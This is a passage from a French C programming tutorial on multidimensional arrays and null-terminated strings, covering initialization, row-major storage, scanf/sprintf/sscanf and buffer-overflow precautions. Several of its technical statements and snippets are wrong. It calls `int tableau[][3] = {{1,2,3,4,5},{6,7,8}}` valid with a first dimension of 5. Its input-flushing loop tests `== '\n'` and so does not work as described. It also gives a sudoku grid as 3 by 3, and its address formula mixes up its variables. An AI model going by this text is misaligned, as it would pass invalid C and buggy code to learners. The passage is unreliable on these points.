d'autre que la fameuse fonction swap qu'on a créée dans l'exercice du chapitre sur les pointeurs. Pour rappel, la voici . Il suffit de commencer par échanger le premier élément et le dernier, puis d'échanger le second avec l'avant-dernier, etc. Plus précisément, on doit échanger l'élément d'indice i avec l'élément d'indice (longueur - i - 1). Il suffit de continuer ainsi jusqu'au milieu du tableau, comme ceci . } Finalement, ils s'avèrent bien pratiques nos tableaux n'est-ce pas ? Ils sont très utiles pour regrouper des variables de même type, et ils permettent une manipulation plus aisée que les structures. De plus, on peut créer un tableau de n'importe quel type, même des tableaux de tableaux. C'est l'objet du chapitre suivant. Les tableaux multidimensionnels Dans le chapitre précédent, nous avons vu des tableaux simples, dans lesquels on plaçait nos éléments bouts à bouts les uns derrières les autres. Si on veux représenter ceux-ci, cela peut se faire sur une seule ligne, sur laquelle on placerait nos éléments dans l'ordre de leurs indices. Il s'agissait des tableaux à une dimension ou uni-dimensionnel. Mais certaines données peuvent être représentées plus simplement sous la forme de tableaux à deux dimensions, organisées en lignes et en colonnes. Par exemple, c'est le cas d'une image. Comme autre exemple, vous pouvez prendre une grille de sudoku : celle-ci est organisée en 3 lignes et en 3 colonnes. Et on pourrait encore trouver d'autres exemples de données organisées en lignes et en colonnes. Le besoin de tableaux rectangulaires se fait sentir, et nos simples tableaux à une dimension ne semblent pas suffire : on doit utiliser des tableaux à deux dimensions. Et bien sachez que le langage C fournit de quoi gérer de tels tableaux. Pire : il fournit de quoi gérer des tableaux de données encore plus complexes, qui possèdent plus de deux dimensions. Ces tableaux, légèrement plus complexes, sont appelées des tableaux multidimensionnels . Ce chapitre va vous parler de ces tableaux et de leur utilité. Grosso-modo, ces tableaux servent quand on a besoin de stocker des données organisées en lignes et colonnes, dans un joli rectangle. Les tableaux à plus de 2 dimensions sont eux beaucoup plus rares, et servent assez peu. Quoiqu'il en soit, nous allons tout de même voir ces tableaux. Déclaration et initialisation Mine de rien, ces tableaux multidimensionnels se comportent comme des tableaux normaux et leur déclaration, initialisation, et utilisation s'effectue de façon similaire à ce qu'on a vu dans le chapitre sur les tableaux à une dimension. Voyons maintenant comment déclarer ces tableaux. Déclaration Pour déclarer un tableau à plusieurs dimensions, on procède comme pour les tableaux à une dimension, avec une toute petite différence. Il faut commencer par indiquer le type des éléments du tableau, puis spécifier l'identificateur, et enfin placer des crochets. Seule différence : on doit utiliser autant de crochets qu'on veut de dimensions. Exemple : si je veux un tableau à deux dimensions, je dois préciser le nombre de lignes, et le nombre de colonnes. Le nombre de lignes sera indiqué entre crochets, et même chose pour le nombre de colonnes. Exemple : un tableau de int de 20 lignes et de 35 colonnes donnera ceci : int tableau2D [ 20 ][ 35 ] ; Et l'on doit mettre autant de crochets que l'on veut de dimensions. En indiquant bien sur la taille entre les crochets, si besoin. Exemples Exemple avec un tableau à deux dimensions : int tableau2D [ 2 ][ 3 ]; Et avec un tableau à trois dimensions : int tableau3D [ 2 ][ 3 ][ 2 ]; Le principe est très simple puisque c'est le même que pour les tableaux à une dimension, mais adapté. Initialisation Initialiser un tableaux à plusieurs dimensions se fait à peu prêt de la même façon qu'avec les tableaux à une dimension. Avec la taille de la première dimension Comme pour les tableaux à une dimension, on peut initialiser ceux-ci en indiquant la taille du tableau. La différence est que cette précision doit se faire pour toutes les dimensions du tableau. Pour un tableau à deux dimensions, on doit ainsi indiquer le nombre de ligne et le nombre de colonnes. La syntaxe pour l'initialisation des tableaux multidimensionnels ressemble à celle utilisée pour les tableaux à une dimension. Mais il y a tout de même une petite différence. Avec un tableau uni-dimensionnel, on effectuait une initialisation avec la syntaxe suivante : type identificateur [nombre d'éléments] = { Valeurs par défaut, séparées par des virgules } Cette syntaxe est réutilisée, mais ce qui est entre les {...} va changer. Ce qu'on initialisera, ce sont des lignes. Chacune de ces lignes est un tableau comme un autre, et notre tableau multidimensionnels peut être vu comme un tableau de tableaux. Et en conséquence, la syntaxe pour initialiser plusieurs lignes va être un peu spéciale. Prenons un exemple : int tableau [ 2 ][ 2 ] = {{ 0 , 1 }, { 2 , 3 }}; Ici, on demande à initialiser la première dimension avec les valeurs 0 et 1, et la deuxième dimension avec les valeurs 2 et 3. Pour faire simple, en gros, tout ce qui est entre { } sert à préciser le contenu d'un tableau. On trouve donc un paquets de { valeur , valeur, valeur , etc } pour chaque ligne. Et ce principe est le même pour tous les tableaux, multidimensionnels ou pas. Il est également possible de ne préciser que certaines valeurs : int tableau [ 2 ][ 2 ] = {{ 0 }, { 2 }}; Toutes les valeurs non-précisées seront automatiquement mises à zéro. On peut d'ailleurs procéder à une mise à zéro de tout le tableau très rapidement et facilement : int tableau [ 2 ][ 3 ][ 4 ] = {{{ 0 }}}; Sans la taille de la première dimension Il est possible lors de la déclaration de ne pas préciser la taille de la première dimension. Ainsi, ce code est parfaitement valide : int tableau [][ 3 ] = {{ 1 , 2 , 3 , 4 , 5 }, { 6 , 7 , 8 }}; Et dans ce cas, la première dimension vaudra 5. Cependant, cela ne marche qu'avec la première dimension. Si vous ne précisez pas la taille des autres dimensions, vous aurez une erreur. Accès à un élèment Maintenant que l'on sait comment déclarer et initialiser nos tableaux à plusieurs dimensions, il nous reste à voir comment manipuler leur contenu. On sait déjà le faire avec nos tableaux à une dimension, et passer à plusieurs dimensions n'est pas vraiment compliqué. La différence entre les tableaux à une dimension et ceux à plusieurs dimensions tient dans le nombre d'indices nécessaires pour repérer un élément dans notre tableau. Par exemple, si je prends un tableau à deux dimensions, je dois préciser l'indice de notre élément dans la ligne, et celui de la colonne. J'ai donc besoin de deux indices. Pour un tableau à trois dimensions, j'aurais besoin de trois indices. Et ainsi de suite : pour un tableau à N dimensions, j'aurais besoin de N indices. Pour rappel, tous les indices commencent à zéro. Pour accéder à un élément, on doit faire la même chose que dans le cas d'un tableau à une dimension : on doit calculer son adresse, et déréférencer celle-ci. Pour ce faire, on peut tout à fait se contenter d'utiliser le formalisme tableau vu dans le chapitre précédent, d'une façon un peu adaptée. Mais il y a tout de même quelques subtilités cachées que nous avons décidés, nous auteurs, de vous révéler. Toutes ces subtilités viennent de la façon dont on calcule l'adresse d'un élément d'un tableau à deux dimension. Et pour calculer cette dernière, on est obligé de savoir comment nos tableaux à plusieurs dimensions sont stockés en mémoire. Row Major Order Prenons le tableau à deux dimensions suivant : Comme vous le voyez, il s'agit d'un tableau d'entiers, à deux dimensions, comprenant trois lignes et trois colonnes. Comme on l'a dit plus haut, l'indice des lignes commence à zéro, tout comme l'indice des colonnes, et ceux-ci vont de 0 à 2. On peut de demander comment ses données sont organisées en mémoire. Et bien le langage C nous dit que toutes les données du tableau sont stockées les unes à coté des autres en mémoire. En clair : les données stockées dans un tableau à plusieurs dimensions sont rassemblées dans un tableau à une seule dimension. Nous avons donc bien avancé. Ceci dit, il nous reste un petit détail à régler. Si je prends le tableau au-dessus, je peux parfaitement stocker celui-ci dans un seul tableau, mais deux deux façons différentes. Je peux tout stocker dans un tableau en mettant les colonnes les unes après les autres. C'est cette solution qui est utilisée dans des langages de programmation comme FORTRAN, mais ce n'est pas le cas en C. En C, nos tableaux sont stockés lignes par lignes. Maintenant que l'on sait cela, reste à savoir comment cela nous aide pour calculer l'adresse d'un élément. Calcul d'adresse Pour illustrer ces histoires de calcul d'adresse, nous allons prendre le cas des tableaux à deux dimensions. Passer aux dimensions supérieures est vraiment facile une fois qu'on sait ce qu'il faut faire pour les tableaux à deux dimensions. Pour localiser une donnée dans un tableau à deux dimensions, on doit d'abord localiser le début de la ligne voulue, puis localiser la donnée dans cette ligne. Vu que nos lignes sont stockées les unes après les autres en mémoire, on peut considérer qu'un tableau à deux dimension est un tableau de ligne. Calculer l'adresse d'une ligne se fait alors très simplement en utilisant la formule vue dans le chapitre précédent. On pose $L$ la longueur d'une ligne, $i$ l'indice de la ligne, et $A$ l'adresse de début du tableau (l'adresse du premier élément). L'adresse de la ligne d'indice $i$ vaut $A + L \\times i$. Ensuite, il nous reste à localiser la donnée dans la ligne à partir de son second indice. Pour cela, on réutilise la formule vue dans le chapitre précédent. On pose $L$ la longueur de la donnée, $j$ l'indice de la ligne, et $AL$ l'adresse du début de la ligne. L'adresse de la donnée ayant pour second indice $j$ vaut $AL + T \\times j$. En combinant ces deux formules, on obtient la formule finale qui nous permet de calculer l'adresse de l'élément d'indice i et j : l'adresse de la donnée d'indices $i$ et $j$ vaut $A + L \\times i + T \\times j$. En clair, cette adresse est assez difficile à calculer. On préférera le formalisme tableau pour accéder à un élément d'un tableau à deux dimensions (ou plus). Cela donne donc des expressions du style tab[i][j] , voyez de vous-même : #include <stdio.h> #define N 3 #define M 5 int main ( void ) { int tab [ N ][ M ] = {{ 0 }}; int i , j ; /* Pour chaque ligne */ for ( i = 0 ; i < N ; i ++ ) { /* Pour chaque case */ for ( j = 0 ; j < M ; j ++ ) { printf ( \"%d \" , tab [ i ][ j ]); } printf ( \" \\n \" ); } return 0 ; } Ce programme affiche le contenu d'un tableau de dimension N et M . Débordements chaotiques Comme pour les tableaux à une dimension, déborder d'un tableau à plusieurs dimensions n'est pas sans conséquences. Le langage C ne fait aucune vérification, et il est facile de déborder d'un tableau à plusieurs dimensions sans s'en rendre compte. Et là encore, ce débordement est toujours un comportement indéterminé. Envoi à une fonction Formalisme pointeur La première possibilité est celle-ci : void fonction ( int ( * tab )[ taille_dimension_2 ]); Cette possibilité exploite juste le lien pointeurs-tableaux ( *tab == tab[] ). Les parenthèses sont importantes car si on ne les mets pas, on obtient un tableau de pointeurs à la place d'un pointeur de tableau ce qui est totalement différent. Pour des tableaux de dimension supérieure, le principe est le même : void fonction(int (*tab)[taille_dimension_2][taille_dimension_3]); Formalisme tableau On peut aussi utiliser le formalisme tableau, comme ceci : void fonction ( int tab [ taille_dimension_1 ][ taille_dimension_2 ]); Pour des tableaux de dimension supérieure, le principe est le même : void fonction ( int tab [ taille_dimension_1 ][ taille_dimension_2 ][ taille_dimension_3 ]); Encore une fois, le choix est votre concernant telle ou telle forme. Dans ce cours, nous utiliserons le formalisme tableau par soucis de clarté. Exercices Comme à l'accoutumée, voici une petite liste d'exercices vous permettant de bien retenir tout ce que vous avez après lors de ce chapitre. Somme, produit, moyenne Je vous propose en premier lieu de réaliser un programme qui calcule la somme et la moyenne de toutes les valeurs d'un tableau à deux dimensions, puis ensuite le produit de chaque ligne. Enfin, vous trouverez la valeur minimum et maximum du votre tableau multidimensionnel. Somme des éléments d'un tableau L'algorithme est très facile à trouver, donc je ne le donnerai pas. En revanche, la correction se trouve ici (à ne regarder qu'après avoir cherché suffisamment ou bien si vous voulez comparer avec votre code). Moyenne des éléments Pour bien fixer les choses, on va dire que calculer la moyenne d'un tableau, c'est calculer la somme de tous les éléments divisé par le produit des dimensions. Si c'est bien clair, vous devriez trouver le code très rapidement ! Sinon, il reste la solution . Produit des lignes Cet exercice n'est pas très compliqué, là encore si vous réfléchissez à ce qu'il faut faire et aux fonctions déjà codées, vous y arriverez sans problème. Besoin quand même d'une correction ? Elle est ici . Minimum et maximum Le but de cet exercice est le même que celui du chapitre précédent : retrouver le maximum et le minimum d'un tableau à deux dimensions. Néanmoins il y a plusieurs dimensions à parcourir. Je n'en dis pas plus, la solution est là au cas où. Triangle de Pascal Les triangles de Pascal sont des objets mathématiques amusants. Voici une petite animation qui expliquera mieux le principe que je ne pourrais le faire. Le but va être de pouvoir générer des triangles de Pascal de la taille que l'utilisateur veut (il faut néanmoins que celle-ci soit inférieure ou égale aux dimensions du tableau). Pour cela, je vais vous donner un algorithme que nous allons décrypter ensemble (oui implémenter bêtement des algorithmes tous faits a un intérêt assez limité). Tout d'abord, la première case est toujours à 1, donc nos boucles ne commenceront pas à 0 puisqu'on ne s'en occupera pas. Ensuite, la première et la dernière case de chaque ligne vaut 1, donc on peut écrire ça déjà. Mais entre ces deux bouts, que se passe t-il ? Eh bien c'est simple : chaque case [i,j] est la somme de la case précédente ([i - 1 , j - 1]) et de la case [i + 1 , j]. Un pseudo-code vous aidera à y voir plus clair. n = taille du triangle de Pascal Mettre la première case du tableau à 1 Pour i = 1, i < n, i = i + 1 Mettre la première case de la ligne à 1 Pour j = 1, j < n - i, j = j + 1 La case [i,j] prend la valeur [i - 1, j - 1] + [i - 1, j] Mettre la dernière case de la ligne à 1 Enfin, n'hésitez pas à faire une petite fonction qui affiche le tableau pour vérifier. Bon courage, vous allez progresser ! [secret]{ Le code est relativement simple, reprenez-le à tête reposée s'il y a des choses que vous ne comprenez pas. Notez que dans la fonction d'affichage, j'évite d'afficher les 0 afin de rendre l'affichage plus lisible (bien entendu, il faut que le tableau de départ soit nul avant d'être passé à ces deux fonctions). } Finalement, ils ne sont pas si terribles que ça ces tableaux multi-dimensionnels n'est-ce-pas ? Ils sont certes beaucoup moins utilisés que les tableaux uni-dimensionnels, mais il était important pour nous de vous montrer leur existence et leur utilité. Si vous ne deviez retenir qu'une chose de ce chapitre, ce serait \"Les tableaux multi-dimensionnels s'utilisent comme les tableaux uni-dimensionnels, il faut donc toujours faire attention aux indices\". Dans le chapitre suivant, nous aborderons un nouveau type d'agrégat, un peu particulier puisqu'il se base sur les tableaux : les chaînes de caractères . Les chaînes de caractères Dans ce chapitre, nous allons passer aux choses sérieuses : nous allons apprendre à manipuler du texte en langage C. Ce texte, il faut bien trouver une solution pour le représenter dans notre ordinateur. Et pour cela, le langage C fournit ce qu'on appelle des chaînes de caractères. Nous allons donc voir en détail ces chaînes, expliquer ce qu'elles sont, montrer comment en créer et donner quelques fonctions de base pour les manipuler. Que la fête commence ! Qu'est ce qu'une chaîne de caractères ? Dans le chapitre sur les variables, j'avais mentionné le type char . Pour rappel, une variable de type char peut contenir une donnée qu'on peut interpréter soit comme un nombre, soit comme une lettre. Le seul problème, c'est qu'une variable de type char ne peut stocker qu'une seule lettre. Cela ne suffit pas pour stocker un roman de Victor Hugo dans son intégralité. Un vrai texte est composé de plusieurs lettres. Si on veut stocker un texte dans notre ordinateur, on doit trouver un moyen pour rassembler plusieurs lettres dans un seul objet, manipulable dans notre langage. Rassembler plusieurs char serait difficile si on n'avait pas vu les chapitres précédents. Grâce à lui nous avons vu comment rassembler plusieurs variables d'un même type dans un seul objet : les tableaux. La solution à notre problème est toute trouvée. Pour rassembler plusieurs char ensemble, il suffit d'utiliser un tableau de char . Et c'est ainsi que le texte est géré en C. bien sûr, il y a moyen de faire autrement. On peut aussi représenter du texte par d'autres structures de données, mais passons. Quoi qu'il en soit, on obtient ainsi ce qu'on appelle des chaines de caractères , aussi appelées strings en anglais. Pascal Strings Quoi qu'il en soit, gérer des chaines de caractère stockées sous la forme de tableaux de char peut se faire de diverses manières. Ces manières se différencient par la façon dont on indique la fin de la chaine de caractère. Dans certains langages de programmation, les chaines de caractères sont stockées sous la forme d'un tableau de char auquel on a ajouté un entier pour indiquer sa longueur. Ainsi, notre chaine de caractère connait elle-même sa longueur, et on peut savoir quand on a atteint la fin en effectuant une comparaison entre l'indice du caractère courant avec la longueur de la chaine. De telles chaines de caractères sont souvent appelées des Pascal Strings , vu qu'elles sont utilisées telles quel dans le langage de programmation Pascal. Null Terminated Strings Mais ce n'est pas ce qui est fait en C ! En C, les chaines de caractères ne connaissent pas leur longueur. À la place, on préfère indiquer la fin de la chaine de caractère avec un caractère spécial. Ce caractère spécial se note '\\0' (également noté 0 ou même '\\x00' ). Ce caractère est appelé caractère nul et marque la fin d'une chaîne de caractère. Les chaines de caractères qui fonctionnent su ce principe sont appelées des Null Terminated Strings , ou encore des C-Strings . On peut se demander quelles sont les raisons qui ont mené à un tel choix, celui-ci ayant quelques désavantages. En effet, lorsqu'on manipule des chaines de caractères, on a souvent besoin de leur longueur : cela permet d'éviter de déborder de la chaine pendant qu'on travaille dessus. Avec des chaines à la Pascal, cette longueur est immédiatement disponible. Mais avec des chaines à la C, on doit parcourir toute la chaine de caractère jusqu'au caractère nul pour en déduire sa longueur. C'est plus lent. D'ailleurs, presque tous les langages modernes (plus récents que le C) préfèrent utiliser des chaines à la Pascal. Si les concepteurs du C ont choisi d'utiliser des Null Terminated Strings , c'est pour pouvoir gérer des chaines de caractères de plus grandes tailles sur le PDP-11, l'ordinateur sur lequel le C a été conçu. En effet, cet ordinateur possédait pas mal de mémoire, et pouvait gérer des chaines de grande taille. Mais, il ne pouvait gérer que des entiers non signés de 16 bits, qui allaient donc de 0 à 65535. S'ils avaient utilisé des chaines à la Pascal, ils auraient été limités par la taille de l'entier qui stocke la longueur. Avec les Null Terminated Strings , ce n'est pas le cas. De plus, les concepteurs du C trouvaient plus simple d'avoir à gérer des Null Terminated Strings . Déclaration et initilisation Déclarer une chaine de caractère, c'est déclarer un tableau de char , et cela peut se faire de deux manières différentes. Première méthode Avec la première méthode, il suffit de placer le mot-clé char , suivi de l'identificateur de la chaine de caractère à créer, et encadrer le tout par un [ suivi d'un ]. On doit aussi indiquer la taille de notre chaine entre les [ ], mais passons. Il n'y a rien de bien compliqué : relisez le chapitre sur les tableaux si vous avez oublié, vous verrez que c'est très simple. char identificateur [ taille ]; Initialisation sans la taille Reste que l'on peut aussi initialiser notre chaine de caractère. Cela se fait comme pour un tableau, à un détail prêt. Quand on initialisait un tableau, on le déclarait, et on lui affectait des valeurs placées entre deux accolades et séparées par une virgule. Le tableau était alors initialisé avec les valeurs placées entre accolades. int tableau [ 25 ] = { 2 , 5 , 6 , 878 , 7897 , 9 }; Pour déclarer et initialiser une chaîne de caractères, on remplace les accolades par deux \" , entre lesquels on place le texte que l'on veut écrire. On utilise donc la syntaxe suivante : char identificateur [] = \"du texte\" ; Cette notation est de nouveau du sucre syntaxique puisque elle nous évite de devoir initialiser chaque case du tableau manuellement, même si c'est possible. Ainsi, le code ci-dessus est strictement équivalent au code ci-dessous, la seule différence étant qu'il est plus rapide d'écrire le premier que le second. char identificateur [] = { 'd' , 'u' , ' ' , 't' , 'e' , 'x' , 't' , 'e' , '\\0' }; Initialisation avec la taille Bien entendu il est possible de préciser la taille du tableau à sa création. Il faut néanmoins se souvenir d'une règle importante : Taille du tableau = Nombre de caractères + '\\0' final. Ainsi, si je veux stocker la chaîne \"Hello world!\" , je dois créer un tableau de 13 cases, car ma chaîne comporte 12 caractères (car l'espace compte comme un caractère). char chaine [ 13 ] = \"Hello world!\" Dans ce cas, le caractère nul sera automatiquement ajouté et j'obtiendrai alors une chaîne parfaitement valide. On peut logiquement se demander ce qu'il se passe si la taille n'est pas suffisante. Il faut distinguer deux cas. Si la taille précisée est inférieure au nombre de caractères, alors il y a risque de plantage lors de l'utilisation de la chaîne. D'ailleurs, le compilateur devrait vous prévenir avec un message du style « warning: initializer-string for array of chars is too long » , ce qui signifie que la chaîne que l'on veut stocker est trop grande par rapport à la taille du tableau. Si la taille précisée est égale au nombre de caractères, alors on obtient non pas une chaîne de caractère, mais un tableau de caractères . Il s'agit simplement d'un tableau qui contient divers caractères, mais qui n'est pas terminé par le caractère nul. Bien entendu, cela peut également amener des problèmes quand on tente de les manipuler. Une autre manière de faire Cependant, il existe une autre façon de déclarer de d'initialiser une chaîne de caractères : un pointeur sur char . La syntaxe est similaire à celle du tableau : char * ptr = \"du texte\" ; Alors qu'elles semblent identiques à première vue, les deux formes possèdent des différences assez importantes. Constantes chaînes Considérons les deux déclarations suivantes. char tab [ 20 ] = \"hello\" ; char * ptr = \"hello\" ; Hormis les différences vues dans le chapitre précédent, c'est surtout le contenu des deux déclarations qui est intéressant. Dans le premier cas, la notation \"hello\" correspond à { 'h', 'e', 'l', 'l', 'o', '\\0' } alors que la deuxième notation est ce que l'on appelle une constante de type chaîne . Une constante de type chaîne est, comme son nom l'indique, un tableau de char constant. Dès lors, le pointeur ptr pointe sur la première case de ce tableau qui est situé quelque part en mémoire. Cependant, comme ce tableau est constant, il est impossible de modifier ses éléments. Ainsi, dans le code suivant, la deuxième ligne provoquera une erreur lors de l'exécution du programme : tab [ 1 ] = 'a' ; ptr [ 1 ] = 'a' ; /* Le résultat est identique avec la forme *(ptr + 1) = 'a' */ Pour éviter ces problèmes, le mieux est de prendre l'habitude de déclarer constant de tels pointeurs. Ainsi, dès que l'on tentera de les modifier, la compilation avortera en affichant une erreur du type « error: assignment of read-only location ' (ptr + 1)' »*. const char * ptr = \"hello\" ; ptr [ 1 ] = 'a' ; Affectation L'autre différence réside dans le fait que ptr peut se voir affecter une nouvelle valeur, tandis que tab ne le peut pas (ce que nous avons dis dans le chapitre sur les tableaux s'applique ici aussi). Ainsi, dans le code suivant, la deuxième affectation est bonne à l'inverse de la première. char tab [ 20 ] = \"hello\" ; char * ptr = \"hello\" ; tab = \"world\" ; ptr = \"world\" ; Pour modifier un tableau de char , il faut faire comme n'importe quel tableau à savoir modifier les éléments un par un : char tab [ 10 ] = \"hello\" ; tab [ 0 ] = 'w' ; tab [ 1 ] = 'o' ; tab [ 2 ] = 'r' ; tab [ 3 ] = 'l' ; tab [ 4 ] = 'd' ; tab [ 5 ] = '\\0' ; Note : Si cela vous intéresse vous pouvez trouver un complément d'information sur ce sujet . Lire et écrire dans une chaîne Il est évidemment possible de saisir des chaînes de caractères au clavier ou de les afficher à l'écran (dans la console). Printf et scanf Les fonctions printf () et scanf () disposent d'un indicateur de conversion qui permet d'afficher ou de demander une chaîne de caractère : %s . Le programme suivant permet d'afficher « Bonjour » à l'écran : /* ou mieux : const char * chaine = \"Bonjour\"; */ char chaine [] = \"Bonjour\" ; printf ( \"%s\" , chaine ); Chaînes et scanf Pour interagir avec l'utilisateur avec la fonction scanf (), on utilise le même indicateur de conversion. Cependant, il faut penser à réserver un espace suffisant lors de la création du tableau pour permettre à l'utilisateur de rentrer une chaîne de caractères sans écraser des données en écrivant après le tableau. Comme il n'est pas possible de connaitre la taille exacte de ce que l'utilisateur va rentrer, on est obligé de créer un grand tableau de char : char chaine [ 256 ]; printf ( \"Donnez votre prenom : \" ); if ( scanf ( \"%s\" , chaine ) == 1 ) { printf ( \"Vous vous appelez %s \\n \" , chaine ); } Petite remarque : pour les chaînes de caractères, on utilise pas le & dans le scanf () car on donne déjà l'adresse de la première case du tableau. Ce code affichera par exemple : Donnez votre prénom : Litchi Vous vous appelez Litchi Chaîne de caractères trop longue Cependant, tout n'est pas si rose ! En effet, dans cet exemple, l'utilisateur peut rentrer jusqu'à 255 caractères (car la dernière case est réservée pour le '\\0' ). Toutefois, si jamais il dépasse cette limite, il va écrire au-delà du tableau et donc potentiellement écraser des données du programme. C'est ce que l'on appel un « dépassement de tampon » (ou buffer overflow en anglais ). Nous disons « potentiellement » parce que le plus souvent, le système d'exploitation empêchera votre programme d'écrire dans une zone mémoire qui ne lui est pas réservée. Néanmoins, ce n'est pas automatique, ni garanti, ce qui rend ce type de problème particulièrement vicieux. Pour éviter ce problème, il est possible de spécifier une taille maximale à la fonction scanf (). Pour ce faire, il suffit de placer un nombre entre le symbole % et le format s , comme ceci : char chaine [ 256 ]; printf ( \"Donnez votre prenom : \" ); if ( scanf ( \"%255s\" , chaine ) == 1 ) { printf ( \"Vous vous appelez %s \\n \" , chaine ); } Attention ! La fonction scanf () ne compte pas le \\0 final ! Il vous est donc nécessaire de lui indiquer la taille de votre tableau diminuée de un. Chaîne de caractères avec des espaces Mais, ce n'est pas tout ! Le format %s signifie en fait : « la plus longue suite de caractère ne comprenant pas d'espaces ». Les espaces étant ici entendu comme une suite d'un ou plusieurs des caractères suivant : ' ' , '\\f' , '\\n' , '\\r' , '\\t' , '\\v' . Autrement dit, si vous entrez : « bonjour tout le monde », scanf () va s'arrêter à « bonjour » (car il y a un espace juste après). Pour éviter ce problème, il est possible d'utiliser un format particulier où vous pouvez spécifier les caractères qui vous intéressent. Celui-ci se présente comme suit : %[liste_de_caracteres] . Par exemple, si vous souhaitez uniquement une suite de nombre, il est possible d'utiliser ce code : char nombre [ 16 ]; printf ( \"Entrez un nombre : \" ); if ( scanf ( \"%15[0123456789]\" , nombre ) == 1 ) { printf ( \"Vous vous entrez : %s \\n \" , nombre ); } Qui donne : Entrez un nombre : 123 Vous vous entrez : 123 Entrez un nombre : 1bbbb Vous vous entrez : 1 Comme vous pouvez le constater, les caractères non numériques ne sont pas lus par scanf () lors de la dernière saisie. -- D'accord, mais si je veux récupérer du texte avec des espaces et de la ponctuation, je fais comment ? J'utilise le format : %[abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!\"#%&'()*+,-./:;<=>?[\\\\\\]&#94;_{|}~ ] ?! o_O Suivant ce que nous venons de voir, oui. &#94;&#94; Cependant, il y a une autre solution ( ouf !) : la négation. Si le symbole &#94; est placé juste après le premier [ alors le format signifie : « la plus longue suite de caractères ne comprenant pas les caractères indiqués ». Ainsi, si je souhaite récupérer une ligne entière, celle-ci étant terminée par un \\n , le code suivant peut être employé : char chaine [ 256 ]; printf ( \"Donnez votre prenom : \" ); if ( scanf ( \"%255[&#94; \\n ]\" , chaine ) == 1 ) { printf ( \"Vous vous appelez %s \\n \" , chaine ); } Ce qui donne : Donnez votre prénom : Charles Henri Vous vous appelez Charles Henri Magnifique ! Problème résolu. :) Une histoire de vidange Mais en fait, non. :p Nous vous avons dit que lorsque scanf () n'a plus assez de place pour lire des caractères ou que ceux-ci ne correspondent pas à ceux attendus par le format courant, ces derniers ne sont pas lus. Cependant, ils ne disparaissent pas dans l'hyperespace, ils sont toujours bien là, prêt à être lu au prochain appel, en témoigne ce petit exemple : char chaine1 [ 16 ]; char chaine2 [ 16 ]; printf ( \"Un morceau : \" ); if ( scanf ( \"%15[&#94; \\n ]\" , chaine1 ) == 1 ) { printf ( \"Un autre morceau : \" ); if ( scanf ( \"%15[&#94; \\n ]\" , chaine2 ) == 1 ) { printf ( \" \\n %s, %s \\n \" , chaine1 , chaine2 ); } } Un morceau : une phrase trop longue Un second morceau : une phrase trop, longue Étant donné que la première saisie comportait trop de caractères, ceux-ci sont restés en attente jusqu'à la suivante, ce qui explique que vous ne pouvez rien entrer lors de la deuxième, la fonction scanf () ayant encore de quoi lire. Note : Nous avons anticipé ce fait en ajoutant un \\n avant le résultat afin qu'il soit sur la troisième ligne. Cependant, ceci est purement cosmétique. -- Oui, mais on s'en débarrasse comment de ces caractères surnuméraires ? En les lisant, tout simplement. :) Étant donné qu'une ligne se termine par un \\n , il est possible de lire le reste comme suit : int c ; while (( c = getchar ()) == '\\n' && c != EOF ) ; Une fois cette boucle exécutée, il vous est loisible d'appeler à nouveau scanf () sans que des caractères non lus ne viennent vous gêner. Note : La fonction getchar () permet de lire un caractère à la fois, nous la verrons plus en détail un peu plus loin. Pour information, celle-ci peut retourner la constante EOF (déclarée dans l'en-tête <stdio.h> ) en cas d'erreur, d'où la seconde condition. Autres fonctions de stdio.h Pour lire et écrire des données, nous avons vu entre autre printf () et scanf (), qui permettent respectivement d'écrire et de lire autant de données que l'on souhaite. Sachez que ces deux fonctions font en réalité partie d'une famille de plusieurs fonctions, toutes définies dans <stdio.h> . Nous allons en découvrir deux. sprintf() - Écrire dans une chaîne La fonction sprintf() , s signifiant string , est comme son nom l'indique une fonction qui permet d'écrire des données dans une chaîne de caractères. Son prototype, qui est un peu particulier, requiert certaines connaissances que vous pouvez acquérir en lisant ce tutoriel . N'hésitez pas à le garder dans un coin, il pourra toujours vous être utile un jour. Le voici : int sprintf ( char * str , const char * format , ...); Elle fonctionne exactement comme printf (), à ceci près que les arguments seront écrits dans str , qui bien entendu doit être de taille suffisante. Enfin, elle retourne le nombre de caractères inscrits (sans compter le \\0 final) ou bien un nombre négatif en cas d'erreur. Une question vous vient peut-être à l'esprit : « mais à quoi peut bien servir cette fonction ? ». En effet, à première vue, écrire dans une chaîne de caractères n'a pas grand intérêt. Je vais vous prouver le contraire avec un exemple. Dans la partie précédente, nous avons vu comment convertir une chaîne de caractères en nombre. Grâce à sprintf (), il est possible de faire l'inverse. #include <stdio.h> int main ( void ) { char str [ 10 ]; int n = 5 ; sprintf ( str , \"%d\" , n ); puts ( str ); return 0 ; } Essayez ce programme et vous verrez que sprintf () a bien écrit le chiffre 5 dans str . Vous pouvez maintenant convertir les nombres en chaînes de caractères de manière portable et efficace ! Cependant, comme pour scanf (), il est nécessaire de faire attention à ne pas dépasser les limites du tableau. Comment s'en assurer ? Malheureusement, il n'est pas possible de spécifier une taille comme pour scanf (), aussi, deux solutions s'offrent à vous : vérifier que le nombre en question ne dépasse pas un certains seuil ; compter la quantité de chiffres composant le nombre avant d'appeler sprintf (). Ainsi, l'exemple ci-dessous ne pose pas de problème puisque je sais que si le nombre est inférieur ou égal à 999 999 999, il n'excèdera pas neuf caractères ( n'oubliez pas de compter le \\0 final ! ). #include <stdio.h> int main ( void ) { char str [ 10 ]; int n ; printf ( \"Entrez un nombre : \" ); if ( scanf ( \"%d\" , & n ) == 1 ) { if ( n <= 999999999L ) { sprintf ( str , \"%d\" , n ); puts ( str ); } } return 0 ; } sscanf() - Lire dans une chaîne La fonction sscanf() permet, comme sa cousine, de manipuler des chaînes de caractères mais cette fois pour les lire et récupérer des données. Voici son prototype : int sscanf ( const char * str , const char * format , ...); Elle renvoie le nombre de formats correctement lus, ou bien un nombre négatif ou inférieur au nombre attendu respectivement si rien n'a pu être converti ou uniquement une partie. Voici un exemple d'utilisation dans lequel on récupère des données dans une chaîne de caractères : #include <stdio.h> int main ( void ) { char str [ 10 ]; int n = 0 ; const char * s = \"5 abcd\" ; if ( sscanf ( s , \"%d %9s\" , & n , str ) == 2 ) { printf ( \"%d %s \\n \" , n , str ); } return 0 ; } Si vous exécutez le programme, vous remarquerez que la variable n vaut maintenant 5 et que str contient bien \"abcd\" . L'intérêt de cette fonction ? Elle permet par exemple de récupérer des données rentrées par un utilisateur comme dans le cas d'une calculatrice ou d'un serveur. Note : La fonction sscanf () ne souffre pas du même problème que scanf () en ce qui concerne de potentiels caractères non lus, nous y reviendrons un peu plus tard. Conversion de chaînes de caractères en nombres 